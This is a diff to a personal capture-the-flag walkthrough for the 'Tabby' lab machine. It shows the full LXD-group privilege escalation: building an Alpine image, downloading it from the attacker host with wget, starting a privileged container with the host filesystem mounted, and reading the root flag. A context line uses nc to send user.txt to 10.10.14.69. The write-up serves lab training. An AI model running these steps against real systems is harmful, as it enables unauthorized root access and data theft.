@@ -339,6 +339,7 @@ tmux
 # tmux should span the entire width and height.
 # tmux works, we have tab completion, control works, vim works!
 
+sudo -l # no sudo for us.
 id
 umask -s
 pushd `pwd`
@@ -377,3 +378,62 @@ nc -lnvp 12345 > user.txt
 # or:
 # nc -q0 10.10.14.69 12345 < /home/ash/user.txt
 ```
+
+Let's take a closer look at `linpeas_ash.log`
+
+we find the following:
+  * ash is part of the `lxd` group
+    * we saw that with `id` already
+    * let's do some research
+      * `LXC` are LinuX Containers, a virtualization technology with a shared Kernel
+      * `LXD` is the LinuX Daemon, a lightweight container hypervisor, built on top of LXC
+        * it's the management API for LXC
+        * Docker uses it
+      * any user that is part of the `lxd` group can use it to gain root write access
+        * https://shenaniganslabs.io/2019/05/21/LXD-LPE.html
+
+```sh
+egrep -i --color=always 'lxc|lxd' filesystem | less -R
+# = or ^g shows progress in file!
+# if you jump to the bottom with G first you will get a percentage from then on out.
+
+# let's get a small container image.
+# I like alpine for Docker, so let's use it again:
+cd /opt
+git clone 'https://github.com/saghul/lxd-alpine-builder.git'
+cd lxd-alpine-builder
+./build-alpine
+
+cd /root/projects/tabby/privesc
+cp /opt/lxd-alpine-builder/*.gz . # alpine-v3.12-x86_64-20201021_1440.tar.gz
+mv *.gz alpine.tar.gz
+```
+
+```sh
+# from tabby/ash:
+find / -iname '*alpine*' | less -R # you can save the output with: s
+# nothing, let's use our own version then:
+
+wget 10.10.14.69/alpine.tar.gz
+lxc ls # see if there are any running. no.
+lxc image import alpine.tar.gz --alias alpine
+lxc image list
+lxc init alpine ignite -c security.privileged=true
+# error: No storage pool found. Please create a new storage pool
+
+lxd init
+# Note that I went with all of the defaults above, except for the “storage backend” which I set to use dir - a simple filesystem directory. Also I set IPv6 to none for more readable output.
+lxc init alpine ignite -c security.privileged=true # now it works.
+lxc config device add ignite 00be disk source=/ path=/mnt/root recursive=true
+lxc ls # find ignite.
+
+lxc start ignite
+lxc ls # we have an ip
+lxc exec ignite /bin/sh
+
+whoami # root!
+find / -iname 'root.txt' 2>/dev/null # /mnt/root/root/root.txt
+cat /mnt/root/root/root.txt # a81e399d36acc11885b57f6d745c36a0
+```
+
+Tabby done!
